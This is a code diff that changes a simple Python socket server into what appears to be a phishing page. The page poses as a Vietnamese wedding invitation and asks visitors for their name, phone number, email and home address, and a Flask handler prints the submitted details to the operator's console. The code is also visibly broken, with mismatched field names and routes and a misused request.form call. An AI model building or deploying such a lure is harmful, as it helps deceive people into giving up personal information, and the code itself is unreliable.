@@ -1,44 +1,85 @@
 import socket
 import sys
-import time
-
-print('[+] starting server handler...')
-time.sleep(3)
+from flask import Flask, render_template, request
 
 IP = '192.168.1.18'
-PORT = 8080
+PORT = 443
 
 def handler():
-	session_handler = True
+	session = True
 	while True:
-		handler_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		handler_connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-		handler_connect.bind((IP, PORT))
-		handler_connect.listen(1)
+		handler_inet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		handler_inet.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		handler_inet.bind((IP, PORT))
+		handler_inet.listen(2)
 
-		print(f'[+] server handler as started http://{IP}:{PORT}...')
-		handler_socket, handler_address = handler_connect.accept()
-		print(f'[+] {handler_address} has open link...')
-		output_http = handler_socket.recv(1024).decode()
-		html = """
-	<html>
-	<title>xin chào bạn</title>
-	<h1>
-	    hello wolrd
-	</h1>
-	<h2>
-	    hello
-	</h2>
-	<body>
-	    Xin chào bạn, rất vui được gặp bạn
-	</body>
-	<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Falun_Gong_Logo.svg/1200px-Falun_Gong_Logo.svg.png' width="300" height="300">"""
-		
-		response_http = 'HTTP/1.1 200 OK\r\n\r\n' + html
-		handler_socket.sendall(response_http.encode())
+		print(f"[+] Start Handler On ( http://{IP}:{PORT}/ )...")
+		handler_connect, handler_address = handler_inet.accept()
 
-		print(f'[+] {output_http}')
+		files_html = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>hello word</title>
+    <img src="https://cdn.tgdd.vn/Products/Images/42/114115/iphone-x-64gb-hh-600x600.jpg" width="200" height="200">
+</head>
+<body>
+    <h1>xin Chao</h1>
+    <h1>thiệp mời đám cưới</h1>
+    <p>đường Hoàng Liên</p>
+    <form action="/login" method="POST">
+        <label for="usr">Họ Tên: </label>
+        <input type="text" id="name" name="name" required><br>
 
-		handler_socket.close()
+        <body></body>
+
+        <label for="sdt">Số Điện Thoại: </label>
+        <input type="text" id="sdt" name="sdt" required><br>
+
+        <body></body>
+
+        <label for="mail">Email: </label>
+        <input type="text" name="emali" required><br>
+
+        <body></body>
+
+        <label for="address">Địa Chỉ Nhà: </label>
+        <input type="text" id="addr" name="addr" required><br>
+
+        <input type="submit" value="Send"> 
+
+    </form>
+</body>
+</html>"""
+
+		response = "HTTP/1.1 200 OK\r\n\r\n" + files_html
+		handler_connect.sendall(response.encode())
+
+		print(f"[+] One REQUESTS From {handler_address}...")
+
+		app = Flask(__name__)
+
+		@app.route('/')
+		def home():
+			return render_template('index.html')
+
+		@app.route('/index', methods=['POST'])
+		def log():
+			usr = request.form('usr')
+			sdt = request.form('sdt')
+			mail = request.form('mail')
+			address = request.form('address')
+
+			print(f"[+] Username : {usr}")
+			print(f"[+] phone : {sdt}")
+			print(f"[+] Mail : {mail}")
+			print(f"[+] Address : {address}")
+
+			return "Logup Success"
+
+		if __name__ == "__main__":
+			app.run(host=f"{IP}", port=int(PORT))
 
 handler()
